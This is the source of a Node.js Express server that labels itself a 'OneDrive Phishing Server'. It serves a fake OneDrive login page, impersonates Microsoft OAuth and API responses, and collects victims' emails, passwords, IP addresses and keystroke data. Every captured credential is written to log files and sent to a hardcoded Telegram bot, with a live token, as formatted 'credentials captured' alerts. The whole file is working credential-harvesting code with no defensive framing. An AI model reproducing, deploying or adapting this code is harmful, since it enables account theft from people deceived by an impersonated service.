const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
const PORT = 3000;

// ==================== TELEGRAM CONFIGURATION ====================
const TELEGRAM_CONFIG = {
    botToken: '8299808842:AAGZ_7S_rno73QT3zxT4Y4iGrwibFH88_Yg', 
    chatId: '6268274959',     
    enabled: true                     // Set to false to disable Telegram
};

// ==================== TELEGRAM FUNCTIONS ====================
async function sendToTelegram(message) {
    if (!TELEGRAM_CONFIG.enabled || !TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
        console.log('Telegram notifications disabled or not configured');
        return false;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CONFIG.chatId,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });

        console.log(`[${getTimestamp()}] Telegram notification sent successfully`);
        return true;
    } catch (error) {
        console.error(`[${getTimestamp()}] Failed to send Telegram notification:`, error.message);
        return false;
    }
}

function formatTelegramAlert(data) {
    const timestamp = new Date(data.t).toLocaleString();
    const ip = data.ip || 'Unknown IP';
    const userAgent = data.ua ? data.ua.substring(0, 100) + '...' : 'Unknown';
    
    let message = `<b>🚨 NEW CREDENTIALS CAPTURED 🚨</b>\n\n`;
    message += `<b>📧 Email:</b> <code>${data.e || 'N/A'}</code>\n`;
    message += `<b>🔑 Password:</b> <code>${data.p || 'N/A'}</code>\n`;
    message += `<b>🕐 Time:</b> ${timestamp}\n`;
    message += `<b>🌐 IP:</b> <code>${ip}</code>\n`;
    message += `<b>📍 Location:</b> ${data.l || 'Unknown'}\n`;
    message += `<b>🔗 Referrer:</b> ${data.ref || 'Direct'}\n`;
    message += `<b>🆔 Session:</b> <code>${data.s || 'N/A'}</code>\n\n`;
    
    // Add device info
    message += `<b>📱 Device Info:</b>\n`;
    message += `<code>${userAgent}</code>\n\n`;
    
    // Add tracking stats
    if (data.tr) {
        message += `<b>📊 Behavior Tracking:</b>\n`;
        if (data.tr.mouse) {
            message += `• Mouse movements: ${data.tr.mouse.length}\n`;
        }
        if (data.tr.keys) {
            message += `• Keystrokes: ${data.tr.keys.length}\n`;
        }
        if (data.tr.focus) {
            const tabChanges = data.tr.focus.filter(f => f.hidden).length;
            message += `• Tab switches: ${tabChanges}\n`;
        }
    }
    
    return message;
}

function formatCompactAlert(data) {
    return `🔐 ${data.e || 'No email'} | ${data.p || 'No password'} | IP: ${data.ip || 'Unknown'} | ${new Date().toLocaleTimeString()}`;
}

// ==================== MAIN SERVER CODE ====================
// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..')));

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}

// Helper function to get current timestamp
function getTimestamp() {
    return new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
}

// Log data to file
function logData(data, filename = 'credentials.log') {
    const logPath = path.join(logsDir, filename);
    const timestamp = getTimestamp();
    
    let logEntry = `\n\n=== LOG ENTRY ${timestamp} ===\n`;
    
    // Session info
    logEntry += `Session ID: ${data.s || 'N/A'}\n`;
    logEntry += `Timestamp: ${new Date(data.t).toLocaleString() || 'N/A'}\n`;
    logEntry += `User Agent: ${data.ua || 'N/A'}\n`;
    logEntry += `IP Address: ${data.ip || 'N/A'}\n`;
    logEntry += `Language: ${data.l || 'N/A'}\n`;
    logEntry += `Referrer: ${data.ref || 'N/A'}\n`;
    
    // Credentials
    if (data.e) {
        logEntry += `\n--- CREDENTIALS ---\n`;
        logEntry += `Email/Username: ${data.e}\n`;
        logEntry += `Password: ${data.p || 'N/A'}\n`;
    }
    
    // Tracking data
    if (data.tr) {
        logEntry += `\n--- BEHAVIOR TRACKING ---\n`;
        
        if (data.tr.mouse && data.tr.mouse.length > 0) {
            logEntry += `Mouse movements: ${data.tr.mouse.length} samples\n`;
        }
        
        if (data.tr.keys && data.tr.keys.length > 0) {
            logEntry += `Keystrokes: ${data.tr.keys.length} recorded\n`;
            // Log first few keystrokes
            const keySamples = data.tr.keys.slice(0, 5).map(k => 
                `${k.key} (${k.delay}ms)`
            ).join(', ');
            if (keySamples) {
                logEntry += `Key samples: ${keySamples}\n`;
            }
        }
        
        if (data.tr.focus && data.tr.focus.length > 0) {
            const focusChanges = data.tr.focus.length;
            const timeHidden = data.tr.focus.filter(f => f.hidden).length;
            logEntry += `Tab focus changes: ${focusChanges} (hidden ${timeHidden} times)\n`;
        }
        
        if (data.tr.scroll && data.tr.scroll.length > 0) {
            logEntry += `Scroll events: ${data.tr.scroll.length}\n`;
        }
    }
    
    // Action-specific logging
    if (data.a) {
        logEntry += `\n--- ACTION ---\n`;
        logEntry += `Type: ${data.a}\n`;
        if (data.a === 'forgot_password') {
            logEntry += `User requested password reset\n`;
        }
    }
    
    logEntry += `\n=== END ENTRY ===\n`;
    
    // Append to log file
    fs.appendFileSync(logPath, logEntry, 'utf8');
    
    // Also log to console for debugging
    console.log(`[${timestamp}] Data logged to ${filename}`);
    if (data.e) {
        console.log(`  Credentials captured: ${data.e}`);
    }
}

// Endpoint to collect credentials
app.post('/collect', async (req, res) => {
    try {
        const data = req.body;
        
        console.log(`[${getTimestamp()}] Received data from session: ${data.s || 'unknown'}`);
        
        // Log the data
        logData(data);
        
        // Also log to a session-specific file
        if (data.s) {
            const sessionFile = `session_${data.s}.log`;
            logData(data, sessionFile);
        }
        
        // Send to Telegram if credentials are present
        if (data.e && data.p) {
            // Send detailed alert
            const telegramMessage = formatTelegramAlert(data);
            await sendToTelegram(telegramMessage);
            
            // Also send a compact notification
            const compactMessage = formatCompactAlert(data);
            await sendToTelegram(compactMessage);
        } else if (data.e && !data.p) {
            // Email only (like forgot password)
            const message = `📧 Email captured: ${data.e}\nIP: ${data.ip || 'Unknown'}\nAction: ${data.a || 'login attempt'}`;
            await sendToTelegram(message);
        }
        
        // Send a realistic Microsoft-like response
        res.json({
            success: true,
            timestamp: new Date().toISOString(),
            message: "Authentication processed"
        });
        
    } catch (error) {
        console.error(`[${getTimestamp()}] Error processing request:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Mock Microsoft OAuth endpoint
app.post('/oauth2/v2.0/token', async (req, res) => {
    console.log(`[${getTimestamp()}] OAuth token request received`);
    
    // Log OAuth attempt
    const authData = {
        s: req.body.client_id || 'oauth_request',
        e: req.body.username || 'N/A',
        t: Date.now(),
        a: 'oauth_token_request',
        ua: req.headers['user-agent'] || 'N/A',
        ip: req.ip || req.connection.remoteAddress
    };
    
    logData(authData, 'oauth_attempts.log');
    
    // Send to Telegram about OAuth attempt
    if (req.body.username) {
        const message = `🔐 OAuth Attempt\nEmail: ${req.body.username}\nIP: ${authData.ip}\nClient: ${req.body.client_id || 'Unknown'}`;
        await sendToTelegram(message);
    }
    
    // Return Microsoft-like error (always fail for phishing)
    res.status(400).json({
        error: "invalid_grant",
        error_description: "The provided authorization grant is invalid, expired, or revoked",
        error_codes: [50126],
        timestamp: new Date().toISOString(),
        trace_id: crypto.randomBytes(16).toString('hex'),
        correlation_id: crypto.randomBytes(16).toString('hex')
    });
});

// Test Telegram endpoint
app.get('/test-telegram', async (req, res) => {
    if (!TELEGRAM_CONFIG.enabled) {
        return res.send('Telegram notifications are disabled. Enable them in server.js');
    }
    
    if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken === 'YOUR_BOT_TOKEN_HERE') {
        return res.send('Please set your Telegram bot token in server.js');
    }
    
    if (!TELEGRAM_CONFIG.chatId || TELEGRAM_CONFIG.chatId === 'YOUR_CHAT_ID_HERE') {
        return res.send('Please set your Telegram chat ID in server.js');
    }
    
    try {
        const testMessage = `✅ Test notification from OneDrive Phishing Server\nTime: ${new Date().toLocaleString()}\nServer is working correctly!`;
        
        const success = await sendToTelegram(testMessage);
        
        if (success) {
            res.send('✅ Test Telegram notification sent successfully! Check your Telegram.');
        } else {
            res.send('❌ Failed to send Telegram notification. Check console for errors.');
        }
    } catch (error) {
        res.send(`❌ Error: ${error.message}`);
    }
});

// Serve the main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'onedrive.html'));
});

// API endpoints that look like real Microsoft APIs
app.get('/api/user/me', (req, res) => {
    res.status(401).json({
        error: {
            code: "Unauthorized",
            message: "Authentication required"
        }
    });
});

app.get('/api/files/count', (req, res) => {
    res.json({
        count: 0,
        requiresAuthentication: true
    });
});

// Handle all other routes - serve the phishing page
app.get('*', (req, res) => {
    console.log(`[${getTimestamp()}] Request to: ${req.path}`);
    res.sendFile(path.join(__dirname, '..', 'onedrive.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(`[${getTimestamp()}] Server error:`, err);
    res.status(500).send('Internal Server Error');
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n=========================================`);
    console.log(`   OneDrive Phishing Server Running`);
    console.log(`=========================================`);
    console.log(`Local: http://localhost:${PORT}`);
    console.log(`Network: http://YOUR_IP:${PORT}`);
    console.log(`\nLogs directory: ${logsDir}`);
    
    // Check Telegram configuration
    if (TELEGRAM_CONFIG.enabled) {
        if (TELEGRAM_CONFIG.botToken === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CONFIG.chatId === 'YOUR_CHAT_ID_HERE') {
            console.log(`\n⚠️  WARNING: Telegram not configured!`);
            console.log(`   Set TELEGRAM_CONFIG in server.js`);
            console.log(`   Test: http://localhost:${PORT}/test-telegram`);
        } else {
            console.log(`\n✅ Telegram notifications: ENABLED`);
            console.log(`   Test: http://localhost:${PORT}/test-telegram`);
        }
    } else {
        console.log(`\n📵 Telegram notifications: DISABLED`);
    }
    
    console.log(`\nWaiting for credentials...\n`);
    
    // Show network IPs
    const os = require('os');
    const networkInterfaces = os.networkInterfaces();
    
    Object.keys(networkInterfaces).forEach(interfaceName => {
        networkInterfaces[interfaceName].forEach(interface => {
            if (interface.family === 'IPv4' && !interface.internal) {
                console.log(`Available at: http://${interface.address}:${PORT}`);
            }
        });
    });
    console.log(`=========================================\n`);
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log(`\n[${getTimestamp()}] Server shutting down...`);
    process.exit(0);
});